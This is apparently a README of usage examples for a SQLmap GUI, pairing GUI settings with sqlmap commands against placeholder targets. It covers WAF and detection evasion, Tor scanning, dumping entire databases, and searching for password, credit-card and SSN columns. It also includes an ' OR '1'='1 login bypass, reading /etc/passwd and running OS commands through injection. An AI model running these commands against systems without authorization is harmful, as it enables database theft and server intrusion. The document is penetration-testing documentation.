# SQLmap GUI Examples - Practical Usage Scenarios

This directory contains practical examples demonstrating various SQL injection testing scenarios using the SQLmap GUI. Each example includes the GUI configuration and the corresponding SQLmap command.

## 📁 Examples Index

- **[Basic Scanning](basic_scanning.md)**: Simple vulnerability detection
- **[Advanced Techniques](advanced_techniques.md)**: Complex injection scenarios
- **[Database Enumeration](database_enumeration.md)**: Structure discovery and data extraction
- **[WAF Bypass](waf_bypass.md)**: Web Application Firewall evasion
- **[Post-Exploitation](post_exploitation.md)**: File system and OS access
- **[Anonymous Scanning](anonymous_scanning.md)**: Tor and proxy usage
- **[API Testing](api_testing.md)**: REST API and GraphQL testing
- **[Custom Scenarios](custom_scenarios.md)**: Specialized use cases

## 🎯 Quick Examples

### Simple GET Parameter Testing
**Target:** `http://example.com/product.php?id=1`

**GUI Configuration:**
```
Target Tab:
- URL: http://example.com/product.php?id=1

Detection Tab:
- Level: 3
- Risk: 2
- Techniques: BEU (Boolean, Error, Union)

General Tab:
- Batch: ✓ Enabled
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/product.php?id=1" --level=3 --risk=2 --technique=BEU --batch
```

### POST Form Authentication Bypass
**Target:** `http://example.com/login.php`

**GUI Configuration:**
```
Target Tab:
- URL: http://example.com/login.php
- Method: POST
- Data: username=admin&password=test

Injection Tab:
- Testable Parameters: username,password
- DBMS: MySQL

Detection Tab:
- Level: 5
- Risk: 3
- Techniques: BEUSTQ (All)

Request Tab:
- Delay: 1
- Timeout: 30
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/login.php" --method=POST --data="username=admin&password=test" -p "username,password" --dbms=mysql --level=5 --risk=3 --technique=BEUSTQ --delay=1 --timeout=30
```

### Database Schema Discovery
**Target:** `http://example.com/admin.php?id=1`

**GUI Configuration:**
```
Target Tab:
- URL: http://example.com/admin.php?id=1
- Cookie: session=abc123

Enumeration Tab:
- Enumerate Databases: ✓
- Enumerate Tables: ✓
- Enumerate Columns: ✓
- Database: (leave empty for all)

General Tab:
- Output Directory: ./results/
- CSV Format: ✓
```

**Generated Command:**
```bash
sqlmap -u "http://example.com/admin.php?id=1" --cookie="session=abc123" --dbs --tables --columns --output-dir=./results/ --csv
```

## 🔧 Common Patterns

### Cookie-Based Authentication
```
Target Tab:
- Cookie: PHPSESSID=abc123; auth=xyz789

Request Tab:
- Safe URL: http://example.com/keepalive.php
- Safe POST: refresh=1
```

### JSON API Testing
```
Target Tab:
- Method: POST
- Data: {"user":"admin","pass":"test"}
- Content-Type: application/json

Injection Tab:
- Base64 Parameters: (if data is base64 encoded)
```

### File Upload Vulnerabilities
```
Target Tab:
- Method: POST
- Data: file=/path/to/file.jpg&submit=Upload

Injection Tab:
- Testable Parameters: file,submit
```

### Search Form Testing
```
Target Tab:
- URL: http://example.com/search.php?q=test

Injection Tab:
- Testable Parameters: q
- Tamper Scripts: space2comment
```

## ⚡ Performance Optimization

### Fast Scanning (Basic Detection)
```
Detection Tab:
- Level: 1
- Risk: 1

Request Tab:
- Threads: 10
- Keep Alive: ✓
```

### Thorough Scanning (Maximum Coverage)
```
Detection Tab:
- Level: 5
- Risk: 3
- Techniques: BEUSTQ

Request Tab:
- Threads: 1
- Delay: 2
```

### Stealth Scanning (Avoid Detection)
```
Request Tab:
- Delay: 5
- Random Agent: ✓
- Tor: ✓

Detection Tab:
- Level: 2
- Risk: 1
```

## 🛡️ WAF Evasion Techniques

### Basic WAF Bypass
```
Injection Tab:
- Tamper Scripts: space2comment,randomcase

Request Tab:
- User-Agent: (custom or random)
- Delay: 3
```

### Advanced WAF Bypass
```
Injection Tab:
- Tamper Scripts: space2comment,apostrophemask,base64encode
- Prefix: ' OR
- Suffix: -- -

Request Tab:
- Random Agent: ✓
- Delay: 5
```

## 📊 Data Extraction Strategies

### Complete Database Dump
```
Enumeration Tab:
- Dump All Databases: ✓

General Tab:
- Output Directory: ./full_dump/
- CSV Format: ✓
```

### Targeted Data Extraction
```
Enumeration Tab:
- Database: users_db
- Table: user_credentials
- Columns: username,password,email
- Dump Table: ✓
```

### Sensitive Data Search
```
Enumeration Tab:
- Search Columns: password,credit_card,ssn
- Search Tables: users,customers,admin
```

## 🔒 Security Testing Scenarios

### Authentication Bypass
```
Target Tab:
- URL: http://example.com/login.php
- Method: POST
- Data: username=admin&password=' OR '1'='1

Injection Tab:
- Testable Parameters: username,password
```

### Privilege Escalation
```
Enumeration Tab:
- Enumerate Users: ✓
- Enumerate Privileges: ✓

OS Access Tab:
- OS Command: sudo -l
```

### File System Access
```
File System Tab:
- Read File: /etc/passwd

OS Access Tab:
- OS Command: find /var/www -name "*.php"
```

## 🌐 Network and Proxy Scenarios

### Corporate Proxy
```
Target Tab:
- Proxy: http://proxy.company.com:8080
- Proxy Credentials: user:password
```

### Tor Anonymous Scanning
```
Request Tab:
- Tor: ✓
- Tor Port: 9050
- Tor Type: SOCKS5
```

### Multiple Proxy Chain
```
Target Tab:
- Proxy File: ./proxies.txt
- Ignore Certificate: ✓
```

## 📱 Mobile and API Testing

### REST API Testing
```
Target Tab:
- URL: http://api.example.com/v1/users/1
- Method: GET
- Header: Authorization: Bearer token123

Request Tab:
- Accept: application/json
```

### GraphQL API Testing
```
Target Tab:
- URL: http://api.example.com/graphql
- Method: POST
- Data: {"query":"{user(id:1){name,email}}"}
- Content-Type: application/json
```

## 🏢 Enterprise Testing

### Load Balancer Testing
```
Target Tab:
- Host: internal-app.company.com

Request Tab:
- Safe URL: http://internal-app.company.com/health
```

### SSO Integration Testing
```
Target Tab:
- Cookie: SAMLResponse=encoded_data

Request Tab:
- Follow Redirects: ✓
```

## 🔧 Troubleshooting Examples

### Slow Response Times
```
Request Tab:
- Timeout: 60
- Retries: 5
- Keep Alive: ✓
```

### Rate Limiting Issues
```
Request Tab:
- Delay: 10
- Threads: 1
- Random Agent: ✓
```

### SSL Certificate Problems
```
Request Tab:
- Ignore Certificate: ✓
- Force SSL: ✓
```

## 📈 Reporting and Documentation

### Executive Summary Report
```
General Tab:
- HTML Format: ✓
- Output Directory: ./reports/executive/
- Verbose Level: 1
```

### Technical Detail Report
```
General Tab:
- Output Directory: ./reports/technical/
- Verbose Level: 6
- Log File: ./reports/technical/debug.log
```

### Compliance Report
```
General Tab:
- CSV Format: ✓
- Output Directory: ./reports/compliance/
- Save Everything: ✓
```

## 🚀 Automation Examples

### Batch Processing
```
General Tab:
- Batch: ✓
- Load Config: ./configs/production.conf
```

### CI/CD Integration
```
General Tab:
- Batch: ✓
- Output Directory: ./test-results/
- Log File: ./test-results/scan.log
```

### Scheduled Scanning
```
General Tab:
- Batch: ✓
- Save Config: ./configs/nightly_scan.conf
```

---

**Remember:** Always ensure you have explicit permission to test any target system. These examples are for educational purposes and authorized security testing only.</content>
<parameter name="filePath">/home/devil/Desktop/SQLmap-GUI-Advanced-SQL-Injection-Testing-Interface/docs/examples/README.md
